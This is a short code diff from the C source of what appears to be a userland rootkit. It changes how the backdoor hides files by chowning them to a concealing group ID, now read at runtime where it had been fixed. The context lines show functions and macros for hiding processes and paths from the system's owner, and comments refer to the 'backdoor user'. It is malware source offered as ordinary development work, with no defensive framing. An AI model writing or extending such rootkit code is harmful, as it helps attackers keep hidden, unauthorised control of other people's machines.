@@ -32,11 +32,6 @@ int hidden_proc(pid_t pid);
 #define hidden_lpath(path)   _l_hidden_path(path, MODE_REG)
 #define hidden_lpath64(path) _l_hidden_path(path, MODE_64)
 
-int chown_path(char *path, gid_t gid){
-    hook(CCHOWN);
-    return (long)call(CCHOWN, path, 0, gid);
-}
-
 #define PATH_ERR   -1  /* error codes for when the backdoor */
 #define PATH_DONE   1  /* user is trying to hide paths from */
 #define PATH_SUCC   0  /* their shell. */
@@ -48,7 +43,7 @@ int hide_path(char *path){
 
     if(not_user(0)) return PATH_ERR;
     if(hidden_path(path)) return PATH_DONE;
-    return chown_path(path, MAGIC_GID);
+    return chown_path(path, readgid());
 }
 
 int unhide_path(char *path){
